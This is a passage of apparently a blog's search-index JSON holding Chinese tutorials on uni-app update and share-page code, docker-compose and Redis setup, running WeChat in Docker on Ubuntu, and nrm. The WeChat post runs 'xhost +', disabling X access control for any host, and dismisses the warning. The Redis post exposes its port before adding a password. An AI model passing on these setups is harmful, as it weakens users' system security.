class=\"attr\">icon</span>: <span class=\"string\">\"none\"</span>,</span><br><span class=\"line\">                          <span class=\"attr\">mask</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">                          <span class=\"attr\">title</span>: <span class=\"string\">\"有新的版本发布，程序已启动自动更新。\"</span>,</span><br><span class=\"line\">                          <span class=\"attr\">duration</span>: <span class=\"number\">5000</span>,</span><br><span class=\"line\">                        });</span><br><span class=\"line\">                        <span class=\"comment\">//设置 最新版本apk的下载链接 这是固定的 每次把包放在这个链接里里面即可 由后端制作</span></span><br><span class=\"line\">                        <span class=\"keyword\">let</span> downloadApkUrl = url;</span><br><span class=\"line\">                        plus.<span class=\"property\">runtime</span>.<span class=\"title function_\">openURL</span>(downloadApkUrl);</span><br><span class=\"line\">                      }</span><br><span class=\"line\">                    } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (res.<span class=\"property\">cancel</span>) {</span><br><span class=\"line\">                      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"下次一定\"</span>);</span><br><span class=\"line\">                    }</span><br><span class=\"line\">                  },</span><br><span class=\"line\">                });</span><br><span class=\"line\">              }</span><br><span class=\"line\">            },</span><br><span class=\"line\">            <span class=\"attr\">fail</span>: <span class=\"keyword\">function</span> (<span class=\"params\">res</span>) {</span><br><span class=\"line\">              uni.<span class=\"title function_\">setStorage</span>({</span><br><span class=\"line\">                <span class=\"attr\">key</span>: <span class=\"string\">\"tip_version_update_time\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">data</span>: currTimeStamp,</span><br><span class=\"line\">                <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) {</span><br><span class=\"line\">                  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"setStorage-success\"</span>);</span><br><span class=\"line\">                },</span><br><span class=\"line\">              });</span><br><span class=\"line\">            },</span><br><span class=\"line\">          });</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(createTime, <span class=\"string\">\"createTimecreateTime\"</span>);</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    },</span><br><span class=\"line\">    <span class=\"attr\">fail</span>: <span class=\"function\">() =&gt;</span> {},</span><br><span class=\"line\">    <span class=\"attr\">complete</span>: <span class=\"function\">() =&gt;</span> {},</span><br><span class=\"line\">  });</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"在APP-vue中注册\"><a href=\"#在APP-vue中注册\" class=\"headerlink\" title=\"在APP.vue中注册\"></a>在 APP.vue 中注册</h3><p>在 <code>App.vue</code> 中，我们需要在 <code>onLaunch</code> 生命周期函数中调用 <code>AppUpdate</code> 方法，来检查是否有新版本的 APP。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { <span class=\"title class_\">AppUpdate</span> } <span class=\"keyword\">from</span> <span class=\"string\">'@/common/AppUpdate.js'</span>;</span><br><span class=\"line\"><span class=\"title function_\">onLaunch</span>(<span class=\"params\"></span>) {    </span><br><span class=\"line\">    <span class=\"title class_\">AppUpdate</span>()</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n","categories":["uni-app","vue","AppUpdate"],"tags":["前端","uni-app","vue","AppUpdate"]},{"title":"uni-app 分享页制作","url":"//uni-app/vue/share.html","content":"<h2 id=\"uni-app-分享页制作\"><a href=\"#uni-app-分享页制作\" class=\"headerlink\" title=\"uni-app 分享页制作\"></a>uni-app 分享页制作</h2><p>通过 canvas 先制作图。可以做一个 canvas 背景在生成一个二维码 canvas 图，在将两个 canvas 合成一个图片，然后将图片分享出来。</p>\n<h3 id=\"html-模板\"><a href=\"#html-模板\" class=\"headerlink\" title=\"html 模板\"></a>html 模板</h3><figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">&lt;template&gt;</span><br><span class=\"line\">    &lt;view class=\"content\"&gt;</span><br><span class=\"line\">        &lt;u-icon name='arrow-left' @click=\"goBack\" style=\"position: absolute; z-index: 999; top: 80rpx; left: 40rpx; font-size: 40rpx; color: #454545;\"&gt;&lt;/u-icon&gt;</span><br><span class=\"line\">        &lt;view style=\"width: 100%; height: calc(100vh - 44px);\"&gt;</span><br><span class=\"line\">            &lt;view class=\"btn-opate\" style=\"\"&gt;</span><br><span class=\"line\">                &lt;button type=\"primary\" size=\"mini\" @click=\"saveImg\"&gt;保存分享&lt;/button&gt;</span><br><span class=\"line\">                &lt;button type=\"default\" size=\"mini\" @click=\"copyCode\"&gt;复制邀请码&lt;/button&gt;</span><br><span class=\"line\">            &lt;/view&gt;</span><br><span class=\"line\">            </span><br><span class=\"line\">            &lt;image class=\"image\" style=\"width: 100%; height: calc(100vh - 44px);\" :src=\"ImagePath\" mode=\"widthFix\"&gt;&lt;/image&gt;</span><br><span class=\"line\">        &lt;/view&gt;</span><br><span class=\"line\">        &lt;view v-if=\"show\"&gt;</span><br><span class=\"line\">            &lt;canvas canvas-id=\"myCanvas\" style=\"width: 100vw; height: 100vh;\"&gt;&lt;/canvas&gt;</span><br><span class=\"line\">            &lt;canvas canvas-id=\"qrcode\"&gt;&lt;/canvas&gt;</span><br><span class=\"line\">        &lt;/view&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &lt;/view&gt;</span><br><span class=\"line\">&lt;/template&gt;</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"二维码制作\"><a href=\"#二维码制作\" class=\"headerlink\" title=\"二维码制作\"></a>二维码制作</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"title class_\">UQRCode</span> <span class=\"keyword\">from</span> <span class=\"string\">'uqrcodejs'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">qrCode</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    uni.<span class=\"title function_\">showLoading</span>({</span><br><span class=\"line\">        <span class=\"attr\">title</span>: <span class=\"string\">'分享页制作中...'</span></span><br><span class=\"line\">    })</span><br><span class=\"line\">    <span class=\"keyword\">var</span> qr = <span class=\"keyword\">new</span> <span class=\"title class_\">UQRCode</span>();</span><br><span class=\"line\">    <span class=\"comment\">// 设置二维码内容</span></span><br><span class=\"line\">    qr.<span class=\"property\">data</span> = <span class=\"string\">`https://app.xianyuangu.com/#/pages/login/h5login?registerCode=<span class=\"subst\">${<span class=\"variable language_\">this</span>.invitationCode}</span>`</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 设置二维码大小，必须与canvas设置的宽高一致</span></span><br><span class=\"line\">    qr.<span class=\"property\">size</span> = <span class=\"number\">120</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 调用制作二维码方法</span></span><br><span class=\"line\">    qr.<span class=\"title function_\">make</span>();</span><br><span class=\"line\">    <span class=\"keyword\">const</span> context = uni.<span class=\"title function_\">createCanvasContext</span>(<span class=\"string\">'qrcode'</span>, <span class=\"variable language_\">this</span>);</span><br><span class=\"line\">    qr.<span class=\"property\">canvasContext</span> = context;</span><br><span class=\"line\">    <span class=\"comment\">// 调用绘制方法将二维码图案绘制到canvas上</span></span><br><span class=\"line\">    qr.<span class=\"title function_\">drawCanvas</span>();</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">        <span class=\"comment\">// 将canvas内容保存为图片</span></span><br><span class=\"line\">        uni.<span class=\"title function_\">canvasToTempFilePath</span>({</span><br><span class=\"line\">            <span class=\"attr\">canvasId</span>: <span class=\"string\">'qrcode'</span>,</span><br><span class=\"line\">            <span class=\"attr\">success</span>: <span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> {</span><br><span class=\"line\">            <span class=\"variable language_\">this</span>.<span class=\"property\">qrcode</span> = res.<span class=\"property\">tempFilePath</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">this</span>.<span class=\"title function_\">drawImageToCanvas</span>();</span><br><span class=\"line\">            },</span><br><span class=\"line\">            <span class=\"attr\">fail</span>: <span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> {</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(err);</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }, <span class=\"variable language_\">this</span>);</span><br><span class=\"line\">    }, <span class=\"number\">1000</span>)</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"绘制图片\"><a href=\"#绘制图片\" class=\"headerlink\" title=\"绘制图片\"></a>绘制图片</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">drawImageToCanvas</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 获取 canvas 上下文</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> systemInfo = uni.<span class=\"title function_\">getSystemInfoSync</span>();</span><br><span class=\"line\">    <span class=\"keyword\">const</span> canvasWidth = systemInfo.<span class=\"property\">windowWidth</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> canvasHeight = systemInfo.<span class=\"property\">windowHeight</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">const</span> context = uni.<span class=\"title function_\">createCanvasContext</span>(<span class=\"string\">'myCanvas'</span>, <span class=\"variable language_\">this</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Step 6: 使用 drawImage 方法绘制图片</span></span><br><span class=\"line\">    context.<span class=\"title function_\">drawImage</span>(<span class=\"string\">'/static/image/share.png'</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, canvasWidth, canvasHeight);</span><br><span class=\"line\">    </span><br><span class=\"line\">    context.<span class=\"title function_\">setFillStyle</span>(<span class=\"string\">'#D43030'</span>); <span class=\"comment\">// 黑色文本</span></span><br><span class=\"line\">    context.<span class=\"title function_\">setFontSize</span>(<span class=\"number\">32</span>); <span class=\"comment\">// 文字大小</span></span><br><span class=\"line\">    context.<span class=\"title function_\">fillText</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">invitationCode</span>, canvasWidth / <span class=\"number\">2</span> - <span class=\"number\">50</span>, canvasHeight / <span class=\"number\">2</span> * <span class=\"number\">0.84</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    context.<span class=\"title function_\">drawImage</span>(</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">qrcode</span>,</span><br><span class=\"line\">    canvasWidth / <span class=\"number\">3</span> - <span class=\"number\">20</span>,</span><br><span class=\"line\">    canvasHeight / <span class=\"number\">2</span>,</span><br><span class=\"line\">    canvasWidth / <span class=\"number\">1</span> ,</span><br><span class=\"line\">    canvasWidth / <span class=\"number\">2</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">    </span><br><span class=\"line\">    context.<span class=\"title function_\">save</span>();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// Step 7: 调用 draw 方法渲染 canvas</span></span><br><span class=\"line\">    context.<span class=\"title function_\">draw</span>(<span class=\"literal\">true</span>, <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">        <span class=\"comment\">// 将canvas内容保存为图片</span></span><br><span class=\"line\">        uni.<span class=\"title function_\">canvasToTempFilePath</span>({</span><br><span class=\"line\">            <span class=\"attr\">canvasId</span>: <span class=\"string\">'myCanvas'</span>,</span><br><span class=\"line\">            <span class=\"attr\">success</span>: <span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> {</span><br><span class=\"line\">            <span class=\"variable language_\">this</span>.<span class=\"property\">show</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">this</span>.<span class=\"property\">ImagePath</span> = res.<span class=\"property\">tempFilePath</span>;</span><br><span class=\"line\">            uni.<span class=\"title function_\">hideLoading</span>();</span><br><span class=\"line\">            <span class=\"comment\">// 在这里可以将得到的图片路径进行保存或分享等操作</span></span><br><span class=\"line\">            },</span><br><span class=\"line\">            <span class=\"attr\">fail</span>: <span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> {</span><br><span class=\"line\">                uni.<span class=\"title function_\">hideLoading</span>();</span><br><span class=\"line\">                <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(err);</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }, <span class=\"variable language_\">this</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">    }, <span class=\"number\">1000</span>));</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"保存图片\"><a href=\"#保存图片\" class=\"headerlink\" title=\"保存图片\"></a>保存图片</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">env</span>: uni.<span class=\"title function_\">getSystemInfoSync</span>().<span class=\"property\">uniPlatform</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">saveImg</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    <span class=\"comment\">// app 保存</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">env</span> == <span class=\"string\">'app'</span>) {</span><br><span class=\"line\">        uni.<span class=\"title function_\">saveImageToPhotosAlbum</span>({</span><br><span class=\"line\">            <span class=\"attr\">filePath</span>: <span class=\"variable language_\">this</span>.<span class=\"property\">ImagePath</span>,</span><br><span class=\"line\">            <span class=\"attr\">success</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">                uni.<span class=\"title function_\">showToast</span>({</span><br><span class=\"line\">                    <span class=\"attr\">title</span>: <span class=\"string\">'保存成功'</span>,</span><br><span class=\"line\">                })</span><br><span class=\"line\">            }</span><br><span class=\"line\">        });</span><br><span class=\"line\">    } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        <span class=\"comment\">/** 生成一个a元素,并创建一个单击事件 */</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> a = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">\"a\"</span>);</span><br><span class=\"line\">        a.<span class=\"property\">download</span> = name || <span class=\"string\">\"photo\"</span>; <span class=\"comment\">// 设置图片名称</span></span><br><span class=\"line\">        a.<span class=\"property\">href</span> = <span class=\"variable language_\">this</span>.<span class=\"property\">ImagePath</span>; <span class=\"comment\">// 将生成的URL设置为a.href属性</span></span><br><span class=\"line\">        a.<span class=\"title function_\">setAttribute</span>(<span class=\"string\">\"id\"</span>, <span class=\"string\">\"myLink\"</span>);</span><br><span class=\"line\">        <span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"title function_\">appendChild</span>(a);</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"链接\"</span>, a);</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"title function_\">exportCodeConfirm</span>();</span><br><span class=\"line\">    }</span><br><span class=\"line\">},</span><br><span class=\"line\"><span class=\"title function_\">exportCodeConfirm</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> event = <span class=\"keyword\">new</span> <span class=\"title class_\">MouseEvent</span>(<span class=\"string\">\"click\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">/** 触发a的单击事件 */</span></span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">\"myLink\"</span>).<span class=\"title function_\">dispatchEvent</span>(event);</span><br><span class=\"line\">    }, <span class=\"number\">0</span>);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n","categories":["uni-app","vue"],"tags":["前端","uni-app","vue","canvas"]},{"title":"docker-compose install","url":"//linux/install/docker-compose.html","content":"<h3 id=\"Curl-下载\"><a href=\"#Curl-下载\" class=\"headerlink\" title=\"Curl 下载\"></a>Curl 下载</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">curl -L \"https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"修改权限\"><a href=\"#修改权限\" class=\"headerlink\" title=\"修改权限\"></a>修改权限</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"查询版本\"><a href=\"#查询版本\" class=\"headerlink\" title=\"查询版本\"></a>查询版本</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker-compose --version</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p>需要将运行 yml 命名为 docker-compose.yml</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>\n","categories":["linux","docker-compose"],"tags":["前端","linux","docker-compose"]},{"title":"Docker 安装 Redis","url":"//linux/docker/redis.html","content":"<h3 id=\"下载redis-镜像\"><a href=\"#下载redis-镜像\" class=\"headerlink\" title=\"下载redis 镜像\"></a>下载 redis 镜像</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker pull redis</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"启动镜像并同步数据\"><a href=\"#启动镜像并同步数据\" class=\"headerlink\" title=\"启动镜像并同步数据\"></a>启动镜像并同步数据</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker run -itd --name redis -p 6379:6379 \\</span><br><span class=\"line\"> --restart=always \\</span><br><span class=\"line\"> -v /home/xt/redis/redis.conf:/etc/redis/redis.conf \\</span><br><span class=\"line\"> -v /home/xt/redis/data:/data \\</span><br><span class=\"line\"> redis redis-server /etc/redis/redis.conf</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"添加密码\"><a href=\"#添加密码\" class=\"headerlink\" title=\"添加密码\"></a>添加密码</h3><h4 id=\"进入容器\"><a href=\"#进入容器\" class=\"headerlink\" title=\"进入容器\"></a>进入容器</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker exec -it 04f824eaf3800958615a9874084ea6d57ab346cd61723a1eb54074a9477f1efe /bin/bash</span><br></pre></td></tr></tbody></table></figure>\n\n<p>在 Redis 命令行中，我们可以使用 config set 命令来设置 Redis 的密码。以下是设置密码的代码和注释。</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">config set requirepass your_password</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"重启Redis容器\"><a href=\"#重启Redis容器\" class=\"headerlink\" title=\"重启Redis容器\"></a>重启 Redis 容器</h3><p>完成上述步骤后，我们需要重启 Redis 容器使密码生效。可以使用以下命令重启 Redis 容器。</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker restart 04f824eaf3800958615a9874084ea6d57ab346cd61723a1eb54074a9477f1efe</span><br></pre></td></tr></tbody></table></figure>","categories":["linux","docker","redis"],"tags":["前端","linux","docker， redis"]},{"title":"ubantu use wechat","url":"//linux/install/wechat.html","content":"<h3 id=\"安装Docker\"><a href=\"#安装Docker\" class=\"headerlink\" title=\"安装Docker\"></a>安装 Docker</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install docker.io</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"拉取镜像\"><a href=\"#拉取镜像\" class=\"headerlink\" title=\"拉取镜像\"></a>拉取镜像</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker pull bestwu/wechat</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"允许所有用户访问图形界面\"><a href=\"#允许所有用户访问图形界面\" class=\"headerlink\" title=\"允许所有用户访问图形界面\"></a>允许所有用户访问图形界面</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">xhost +</span><br></pre></td></tr></tbody></table></figure>\n\n<p>注意，这条命令可能会提示：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">access control disabled, clients can connect from any host</span><br></pre></td></tr></tbody></table></figure>\n\n<p>看到这样的提示信息，表示命令执行成功，不是什么报错信息。</p>\n<h3 id=\"创建Docker容器\"><a href=\"#创建Docker容器\" class=\"headerlink\" title=\"创建Docker容器\"></a>创建 Docker 容器</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --name wechat\\</span><br><span class=\"line\">    --device /dev/snd\\</span><br><span class=\"line\">    --ipc=host\\</span><br><span class=\"line\">    -v /tmp/.X11-unix:/tmp/.X11-unix\\</span><br><span class=\"line\">    -v /home/batype/WeChatFiles:/WeChatFiles\\</span><br><span class=\"line\">    -v /home/batype:/batype\\</span><br><span class=\"line\">    -e DISPLAY=unix$DISPLAY\\</span><br><span class=\"line\">    -e XMODIFIERS=@im=fcitx\\</span><br><span class=\"line\">    -e QT_IM_MODULE=fcitx\\</span><br><span class=\"line\">    -e GTK_IM_MODULE=fcitx\\</span><br><span class=\"line\">    -e GID=`id -g`\\</span><br><span class=\"line\">    -e UID=`id -u`\\</span><br><span class=\"line\">    bestwu/wechat</span><br></pre></td></tr></tbody></table></figure>\n\n<p>注意！注意！注意！上述代码不能直接使用，需要一定的修改！！！</p>\n<ul>\n<li><p>将代码中的 batype 改成自己的用户名！！！</p>\n</li>\n<li><p>如果你是 ibus 输入法，将代码中的 fcitx 改成 ibus！！！</p>\n</li>\n</ul>\n<h3 id=\"等待微信启动\"><a href=\"#等待微信启动\" class=\"headerlink\" title=\"等待微信启动\"></a>等待微信启动</h3><p>注意！！！当你执行完 docker run 之后，大约需要等待 1-2 分钟后，才会弹出微信的登录窗口。一定要有信心，有耐心，不要放弃，要耐心等待 1-2 分钟！</p>\n<p>等待完成后，即可看到微信的登录界面，扫码登录即可尽情使用！</p>\n<h3 id=\"常见问题\"><a href=\"#常见问题\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h3><h4 id=\"微信的字体特别小\"><a href=\"#微信的字体特别小\" class=\"headerlink\" title=\"微信的字体特别小\"></a>微信的字体特别小</h4><p>安装完 Docker 微信后，字特别小，根本看不清，太费眼睛。</p>\n<p>解决方法：</p>\n<ol>\n<li>进入容器内部 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker exec -it wechat bash</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>切换到 wechat 用户（此步骤不可省略，否则下面的步骤无法进行！！！）</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">su wechat</span><br></pre></td></tr></tbody></table></figure>\n<ol start=\"3\">\n<li>打开配置 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">WINEPREFIX=~/.deepinwine/Deepin-WeChat/ deepin-wine winecfg</span><br></pre></td></tr></tbody></table></figure>\n<ol start=\"4\">\n<li>在弹出窗口中，打开 “显示” 选项卡，找到最下面 “屏幕分辨率”，改成 200dpi 即可。</li>\n</ol>\n<h4 id=\"运行微信之后，出现一个wine-system-tray的小窗口\"><a href=\"#运行微信之后，出现一个wine-system-tray的小窗口\" class=\"headerlink\" title=\"运行微信之后，出现一个wine system tray的小窗口\"></a>运行微信之后，出现一个 wine system tray 的小窗口</h4><p>这是 wine 的系统栏，是正常现象，其实可以把那个窗口关掉，没什么影响。</p>\n<h4 id=\"我不小心把微信的窗口叉掉了，怎么办\"><a href=\"#我不小心把微信的窗口叉掉了，怎么办\" class=\"headerlink\" title=\"我不小心把微信的窗口叉掉了，怎么办\"></a>我不小心把微信的窗口叉掉了，怎么办</h4><p>执行下面命令即可：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker restart wechat -t 0</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"无法输入中文\"><a href=\"#无法输入中文\" class=\"headerlink\" title=\"无法输入中文\"></a>无法输入中文</h4><p>这是因为你使用的是 ibus 输入法，而你未将启动命令中的 ibus 改成 fcitx。</p>\n<h4 id=\"播放视频没有声音\"><a href=\"#播放视频没有声音\" class=\"headerlink\" title=\"播放视频没有声音\"></a>播放视频没有声音</h4><p>首先删掉容器</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker rm -f wechat</span><br></pre></td></tr></tbody></table></figure>\n\n<p>然后重新运行一个</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --name wechat\\</span><br><span class=\"line\">    --device /dev/snd\\</span><br><span class=\"line\">    --ipc=host\\</span><br><span class=\"line\">    -v /tmp/.X11-unix:/tmp/.X11-unix\\</span><br><span class=\"line\">    -v /home/batype/WeChatFiles:/WeChatFiles\\</span><br><span class=\"line\">    -v /home/batype:/batype\\</span><br><span class=\"line\">    -e DISPLAY=unix$DISPLAY\\</span><br><span class=\"line\">    -e XMODIFIERS=@im=fcitx\\</span><br><span class=\"line\">    -e QT_IM_MODULE=fcitx\\</span><br><span class=\"line\">    -e GTK_IM_MODULE=fcitx\\</span><br><span class=\"line\">    -e AUDIO_GID=`getent group audio | cut -d: -f3`\\</span><br><span class=\"line\">    -e GID=`id -g`\\</span><br><span class=\"line\">    -e UID=`id -u`\\</span><br><span class=\"line\">    bestwu/wechat</span><br></pre></td></tr></tbody></table></figure>\n<p>注意，加了这一行</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">-e AUDIO_GID=`getent group audio | cut -d: -f3`\\</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这样的话，播放视频就有声音了。</p>\n","categories":["linux","wechat"],"tags":["前端","linux","wechat"]},{"title":"nrm 管理 npm registry","url":"//web/npm/nrm.html","content":"<h4 id=\"Install\"><a href=\"#Install\" class=\"headerlink\" title=\"Install\"></a>Install</h4><p><code>npm install -g nrm</code></p>\n<h4 id=\"nrm-ls\"><a href=\"#nrm-ls\" class=\"headerlink\" title=\"nrm ls\"></a>nrm ls</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nrm ls</span><br><span class=\"line\"></span><br><span class=\"line\">npm ---------- https://registry.npmjs.org/</span><br><span class=\"line\">yarn --------- https://registry.yarnpkg.com/</span><br><span class=\"line\">tencent ------ https://mirrors.cloud.tencent.com/npm/</span><br><span class=\"line\">cnpm --------- https://r.cnpmjs.org/</span><br><span class=\"line\">taobao ------- https://registry.npmmirror.com/</span><br><span class=\"line\">npmMirror ---- https://skimdb.npmjs.com/registry/</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"nrm-use\"><a href=\"#nrm-use\" class=\"headerlink\" title=\"nrm use\"></a>nrm use</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nrm use taobao</span><br><span class=\"line\">Registry has been set to: https://registry.npmmirror.com/</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"Usage\"><a href=\"#Usage\" class=\"headerlink\" title=\"Usage\"></a>Usage</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">Usage: nrm [options] [command]</span><br><span class=\"line\"></span><br><span class=\"line\">Options:</span><br><span class=\"line\">  -V, --version                           output the version number</span><br><span class=\"line\">  -h, --help                              output usage information</span><br><span class=\"line\"></span><br><span class=\"line\">Commands:</span><br><span class=\"line\">  ls                                      List all the registries</span><br><span class=\"line\">  current [options]                       Show current registry name or URL</span><br><span class=\"line\">  use &lt;registry&gt;                          Change registry to registry</span><br><span class=\"line\">  add &lt;registry&gt; &lt;url&gt; [home]             Add one custom registry</span><br><span class=\"line\">  login [options] &lt;registryName&gt; [value]  Set authorize information for a custom registry with a base64 encoded string or username and pasword</span><br><span class=\"line\">  set-hosted-repo &lt;registry&gt; &lt;value&gt;      Set hosted npm repository for a custom registry to publish packages</span><br><span class=\"line\">  set-scope &lt;scopeName&gt; &lt;value&gt;           Associating a scope with a registry</span><br><span class=\"line\">  del-scope &lt;scopeName&gt;                   Remove a scope</span><br><span class=\"line\">  set [options] &lt;registryName&gt;            Set custom registry attribute</span><br><span class=\"line\">  rename &lt;registryName&gt; &lt;newName&gt;         Set custom registry name</span><br><span class=\"line\">  del &lt;registry&gt;                          Delete one custom registry</span><br><span class=\"line\">  home &lt;registry&gt; [browser]               Open the homepage of registry with optional browser</span><br><span class=\"line\">  publish [options] [&lt;tarball&gt;|&lt;folder&gt;]  Publish package to current registry if current registry is a custom registry.</span><br><span class=\"line\">   if you're not using custom registry, this command will run npm publish directly</span><br><span class=\"line\">  test [registry]                         Show response time for specific or all registries</span><br><span class=\"line\">  help                                    Print this help </span><br><span class=\"line\">   if you want to clear the NRM configuration when uninstall you can execute \"npm uninstall nrm -g -C or npm uninstall nrm -g 